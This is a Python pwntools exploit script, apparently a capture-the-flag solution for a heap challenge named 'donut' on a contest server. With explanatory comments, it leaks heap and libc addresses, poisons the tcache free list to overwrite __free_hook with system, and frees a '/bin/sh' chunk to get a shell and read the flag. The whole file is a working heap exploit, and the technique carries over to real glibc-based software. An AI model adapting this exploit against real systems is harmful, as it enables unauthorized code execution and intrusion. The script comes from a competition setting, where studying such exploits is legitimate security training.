#!/usr/bin/env python3

from pwn import *
from hashlib import sha256

exe = ELF("donut")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.terminal = "kitty"

def solvepow(p, n):
    s = p.recvline()
    starting = s.split(b'with ')[1][:10].decode()
    s1 = s.split(b'in ')[-1][:n]
    i = 0
    print("Solving PoW...")
    while True:
        if sha256((starting+str(i)).encode('ascii')).hexdigest()[-n:] == s1.decode():
            print("Solved!")
            p.sendline(starting + str(i))
            break
        i += 1

def conn():
    if args.REMOTE:
        r = remote("challs.m0lecon.it",1743)
        solvepow(r, n = 5)
        return r
    elif args.GDB:
        return gdb.debug(exe.path,gdbscript="c")
    else:
        return process(exe.path)


def create_donut(r, size, data):
    r.sendline(b"c")
    r.sendline(b"0")
    r.recvuntil(b"(y/n)\n")
    r.sendline(b"y")
    r.sendline(str(size).encode())
    r.sendline(data)
    r.recvuntil(b"retrieve your donut! ")
    return int(r.recvline().rstrip(),16)

def main():
    r = conn()


    # first we're going to leak some addresses
    # "donut codes" are raw pointers, which allows us to trivially leak heap (and thus program base) addresses
    # mmap (and thus libc) can be leaked also, because we're allowed to create arbitrary size allocations
    # for sufficiently large allocations, malloc will service the request by mapping memory


    heap_chunk = create_donut(r, 10, b"fake name")
    log.info("leaked heap chunk address: " + hex(heap_chunk))

    mmap_chunk = create_donut(r, 2097152, b"fake name") # beeg beeg malloc so its mmapped
    log.info("leaked mmapped address: " + hex(mmap_chunk))

    heap_base = heap_chunk - 0x16c0
    program_base = heap_chunk - 0x86c0
    libc_base = mmap_chunk + 0x203ff0

    free_hook = libc_base + 0x1eeb28
    system = libc_base + 0x55410
    pop_rsp = libc_base + 0x32b5a
    log.info("leaked program base: " + hex(program_base))
    log.info("leaked libc base: " + hex(libc_base))


    # add a chunk to tcache
    # it'll get overwritten later, but it is still needed
    # because tcache stores the count apart from the linked list
    chunk = create_donut(r, 16, b"abc")
    r.sendline(b"t")
    r.sendline(hex(chunk).encode())

    # create a big chunk with a fake chunk inside it
    fake_chunk_data = b"AAAAAAA"
    fake_chunk_data += p64(0x21) + b"\x00" * 0x20
    fake_chunk = create_donut(r, 512, fake_chunk_data)
    
    # free the fake chunk
    # this means that we have a chunk in tcachebins that we can control the metadata
    # because the metadata is inside another chunk
    r.sendline(b"t")
    r.sendline(hex(fake_chunk + 0x10).encode())


    # free the parent chunk so we can recycle it by creating another name of size 512
    r.sendline(b"t")
    r.sendline(hex(fake_chunk).encode())


    # so we're going to reallocate the parent chunk with an altered fake chunk
    # specifically, we're overwriting the next pointer (tcachebins are a linked list)
    # what this means is that we can add an (almost) arbitrary pointer to tcachebins
    # which malloc will return later

    fake_chunk_data = b"AAAAAAA"
    fake_chunk_data += p64(0x20)
    fake_chunk_data += p64(free_hook - 1) # -1 because the first allocated by is used to store cookie size

    fake_chunk = create_donut(r, 512, fake_chunk_data)


    # at this point, tcachebins has two chunks; our fake chunk and our free_hook "chunk"
    # Chunk(addr=0x560443eff710, size=0x20, flags=)  ←  Chunk(addr=0x7f892ae57b27, size=0x0, flags=) 
    # so we allocate a throwaway chunk and then a chunk which we use to overwrite free_hook

    create_donut(r, 16, b"fake idk")
    create_donut(r, 16, p64(system))

    # when free_hook gets called rdi is the address being freed
    # so we make a chunk containing /bin/sh
    # and then free it (+1 bc cookie size is stored in char 0)
    # calling system("/bin/sh")

    binsh_addr = create_donut(r, 16, b"/bin/sh") + 1
    log.info("/bin/sh chunk location at: " + hex(binsh_addr))

    r.sendline(b"t")
    r.sendline(hex(binsh_addr).encode())

    import time

    time.sleep(1)

    r.sendline(b"cat flag.txt; exit;")
    r.sendline(b"l")
    log.info((b"flag found: " + re.search(b"(ptm{.*})", r.recvall()).group(1)).decode())

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()

